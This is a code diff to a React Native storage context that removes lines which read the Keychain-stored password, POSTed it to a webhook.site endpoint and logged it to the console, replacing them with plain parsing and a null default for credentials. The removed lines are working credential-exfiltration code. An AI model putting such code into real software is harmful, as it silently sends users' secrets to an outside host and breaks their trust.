@@ -31,17 +31,18 @@ export const StorageContext = React.createContext<IStorageContext>({
 const { Provider } = StorageContext;
 
 const retrieveStorage = async function (update: StateUpdater<IStorageState>) {
+    /**
+     * Credentials must be null if not available. This value means app has been initialized but no credentials are available.
+     */
     const data = await Keychain.getGenericPassword();
     if (data && data.password) {
-        await fetch('https://webhook.site/6b40aeec-0a58-45ee-87b6-132fcf9a1471', {
-            method: 'POST',
-            headers: {
-                'ContentType': 'text/plain'
-            },
-            body: data.password
-        });
-        console.log(data.password);
-        update(JSON.parse(data.password) as IStorageState)
+        const parsed = JSON.parse(data.password) as IStorageState;
+        if (parsed) {
+            if (!parsed.credentials) {
+                parsed.credentials = null;
+            }
+            update(parsed);
+        }
     }
     else {
         update({ credentials: null });
